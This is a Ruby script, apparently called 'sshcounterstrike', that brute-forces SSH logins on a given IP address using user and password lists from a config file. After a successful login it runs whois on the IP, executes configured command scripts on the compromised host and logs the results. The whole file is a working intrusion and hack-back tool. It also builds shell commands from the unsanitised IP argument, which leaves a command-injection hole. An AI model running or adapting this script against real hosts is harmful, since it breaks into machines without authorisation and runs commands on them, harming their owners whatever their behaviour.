#!/usr/local/bin/ruby

require 'logger'
require 'net/ssh'
require 'psych'
require 'timeout'

CS_HEADER = '<-> From sshcounterstrike:'
COUNTER_LOGS = './sshcounterstrike.logs'

cfg = Psych.load_file('./sshcounterstrike.yml')

system("mkdir #{COUNTER_LOGS}") unless Dir.exists?(COUNTER_LOGS)

ip = ARGV[0]
port = cfg['ports'].shift

log = Logger.new('sshcounterstrike.log')
sink_log = Logger.new('./sshsink.log')

begin
    Timeout::timeout(cfg['timeout']) do
        cfg['users'].each do |user|
            cfg['passwds'].each do |passwd|
                begin
                    Net::SSH.start(ip,
                                   user,
                                   :non_interactive => true,
                                   :password => passwd,
                                   :port => port,
                                   :timeout => 120,
                                   :logger => nil,
                                   :user_known_hosts_file => '/dev/null') do |ssh|
                        log.info("GOT IT! IP #{ip} port #{port} user #{user} passwd #{passwd}")
                        sink_log.info("#{CS_HEADER} GOT IT! IP #{ip} port #{port} user #{user} passwd #{passwd}")


                        if cfg['scripts'].any? { |name, script| script['active'] }
                            File.open("#{COUNTER_LOGS}/#{ip}.log", 'a') do |f|
                                f.puts(`whois #{ip}`)
                                cfg['scripts'].select { |name, script| script['active'] }.each do |name, script|
                                    f.puts("--- Running script #{name}")
                                    script['cmds'].each do |cmd|
                                        f.puts("*** Executing cmd: #{cmd}")
                                        f.write(ssh.exec!(cmd))
                                    end
                                end
                            end
                        end

                        raise RuntimeError.new('Break in! Leaving loops')
                    end
                rescue Net::SSH::AuthenticationFailed => ex
                    # No more logging here
                rescue SystemCallError => x7
                    sink_log.info("#{CS_HEADER}  #{x7.class.to_s} at IP #{ip}:#{port}")
                    port = cfg['ports'].shift
                    raise RuntimeError.new('leave loops') unless port
                end
            end
        end
        log.info("All authentications failed at IP #{ip}:#{port}")
        sink_log.info("#{CS_HEADER} All authentications failed at IP #{ip}:#{port}")
    end
rescue Exception => ex
    sink_log.info("#{CS_HEADER} Received exception #{ex.class}: #{ex.message} for IP #{ip}:#{port}")
end
